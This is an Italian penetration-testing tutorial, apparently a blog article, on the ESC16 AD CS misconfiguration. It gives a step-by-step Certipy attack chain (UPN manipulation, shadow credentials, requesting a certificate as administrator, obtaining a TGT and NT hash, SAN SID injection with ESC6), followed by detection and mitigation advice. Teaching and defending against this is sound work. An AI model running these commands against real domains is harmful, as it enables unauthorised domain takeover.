---
title: 'ESC16 ADCS: CA con SID Security Extension Disabilitata'
slug: esc16-adcs
description: ESC16 sfrutta una CA configurata per non includere la SID Security Extension nei certificati. Questo indebolisce il certificate mapping e può permettere impersonation.
image: /BCO.52f4c812-c2f0-4287-a6c2-cc8fe8e63860.webp
draft: true
date: 2026-03-10T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - ad
  - esc
  - adcs
  - certipy
---

ESC16 è una tecnica di **Active Directory Privilege Escalation tramite AD CS** in cui la **Certificate Authority è configurata per disabilitare globalmente la SID security extension** nei certificati emessi.

Questa estensione:

```
1.3.6.1.4.1.311.25.2
```

(`szOID_NTDS_CA_SECURITY_EXT`)

contiene il **SID dell’account AD** e viene usata dai Domain Controller per il **strong certificate mapping** introdotto con gli update di sicurezza del 2022 (KB5014754).

Se questa estensione viene disabilitata a livello di CA, **tutti i certificati emessi dalla CA non conterranno il SID**.
Questo forza i Domain Controller a usare **metodi di mapping legacy più deboli** come:

* SAN UPN
* SAN DNS

Di fatto **tutti i template della CA diventano equivalenti a ESC9**.

***

# Dove nasce la misconfigurazione

La CA può disabilitare l’estensione tramite registry:

```
policy\DisableExtensionList
```

Path completo:

```
HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA-NAME>\PolicyModules\<PolicyModule>
```

Se il valore contiene:

```
1.3.6.1.4.1.311.25.2
```

la CA **non inserirà mai la SID extension nei certificati**.

***

# Quando ESC16 è sfruttabile

L’exploit dipende dalla configurazione dei Domain Controller.

Registro:

```
StrongCertificateBindingEnforcement
```

Valori:

| Valore | Modalità         |
| ------ | ---------------- |
| 0      | Disabled         |
| 1      | Compatibility    |
| 2      | Full Enforcement |

ESC16 è sfruttabile quando:

```
StrongCertificateBindingEnforcement ≠ 2
```

***

# Identificazione con Certipy

```bash
certipy find -u attacker@corp.local -p 'Passw0rd!'
```

Output tipico:

```
Disabled Extensions : 1.3.6.1.4.1.311.25.2

[!] Vulnerabilities
ESC16 : Security Extension is disabled
```

Questo indica che la CA **non include la SID extension nei certificati**.

***

# Exploitation ESC16

Poiché i certificati non contengono il SID, il DC deve usare mapping deboli.

L’attacco tipico è **UPN manipulation**.

***

# Scenario 1 — UPN Manipulation

Prerequisiti:

* controllo UPN su un account
* enrollment su un template con Client Authentication

***

## Step 1 — leggere UPN

```bash
certipy account \
-u attacker@corp.local -p 'Passw0rd!' \
-dc-ip 10.0.0.100 \
-user victim read
```

***

## Step 2 — modificare UPN

```bash
certipy account \
-u attacker@corp.local -p 'Passw0rd!' \
-dc-ip 10.0.0.100 \
-user victim \
-upn administrator update
```

***

## Step 3 — ottenere credenziali victim

```bash
certipy shadow \
-u attacker@corp.local -p 'Passw0rd!' \
-dc-ip 10.0.0.100 \
-account victim auto
```

Output:

```
Saving credential cache to victim.ccache
```

***

## Step 4 — richiedere certificato

```
export KRB5CCNAME=victim.ccache
```

```bash
certipy req \
-k \
-dc-ip 10.0.0.100 \
-target CA.CORP.LOCAL \
-ca CORP-CA \
-template User
```

Output:

```
Got certificate with UPN 'administrator@corp.local'
Certificate has no object SID
Saving certificate to administrator.pfx
```

Il certificato **non contiene SID**.

***

## Step 5 — ripristinare UPN

```bash
certipy account \
-u attacker@corp.local -p 'Passw0rd!' \
-dc-ip 10.0.0.100 \
-user victim \
-upn victim@corp.local update
```

***

## Step 6 — autenticazione

```bash
certipy auth \
-pfx administrator.pfx \
-dc-ip 10.0.0.100 \
-username administrator \
-domain corp.local
```

Output:

```
Got TGT
Got NT hash for administrator
```

***

# Scenario 2 — ESC16 + ESC6

Se la CA è vulnerabile anche a **ESC6**, l’attacco funziona **anche con strong binding attivo**.

L’attaccante può inserire il SID direttamente nel SAN.

```bash
certipy req \
-u attacker@corp.local -p 'Passw0rd!' \
-dc-ip 10.0.0.100 \
-target CA.CORP.LOCAL \
-ca CORP-CA \
-template User \
-upn administrator@corp.local \
-sid S-1-5-21-...-500
```

Il certificato contiene:

```
SAN UPN
SAN SID URL
```

Questo permette autenticazione anche con **StrongCertificateBindingEnforcement = 2**.

***

# Impatto ESC16

ESC16 può portare a:

* impersonation utenti privilegiati
* Kerberos TGT
* NTLM hash
* compromissione completa del dominio

***

# Detection ESC16

Indicatori principali:

* CA con `DisableExtensionList`
* presenza OID:

```
1.3.6.1.4.1.311.25.2
```

Audit utile:

```
certipy find
```

oppure

```
certutil -getreg policy\DisableExtensionList
```

***

# Mitigation ESC16

## Riabilitare la SID extension

Sul server CA:

```bash
certutil -setreg policy\DisableExtensionList -1.3.6.1.4.1.311.25.2
net stop certsvc
net start certsvc
```

Questo rimuove la disabilitazione.

***

## Aggiornare la CA

Installare gli update dopo:

```
KB5014754
```

per supportare **strong certificate mapping**.

***

## Abilitare Strong Binding sui DC

Registro:

```
StrongCertificateBindingEnforcement = 2
```

Questo forza il mapping tramite **SID extension**.

***

# FAQ — ESC16 ADCS

### Cos'è ESC16?

Una misconfigurazione della CA che disabilita globalmente la **SID security extension**.

### Qual è il problema?

I certificati non contengono SID, quindi i DC usano **mapping legacy più deboli**.

### ESC16 è simile a ESC9?

Sì, ma a livello **CA globale**, non template.

### ESC16 può portare a Domain Admin?

Sì, tramite **UPN manipulation o SAN injection**.

***

**Key Takeaway:** se la CA disabilita la SID security extension, tutti i certificati tornano al modello di mapping legacy e diventano sfruttabili per impersonation.

***

> ESC16 è l’ultima tecnica della serie AD CS certificate attacks.
> Guida completa:
> [https://hackita.it/articoli/adcs-esc1-esc16](https://hackita.it/articoli/adcs-esc1-esc16)Supporta HackIta:
> [https://hackita.it/supporto](https://hackita.it/supporto)Pentest Active Directory o formazione offensiva:
> [https://hackita.it/servizi](https://hackita.it/servizi)Riferimenti tecnici:
> [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)
> [https://specterops.io/blog/2021/06/17/certified-pre-owned/](https://specterops.io/blog/2021/06/17/certified-pre-owned/)
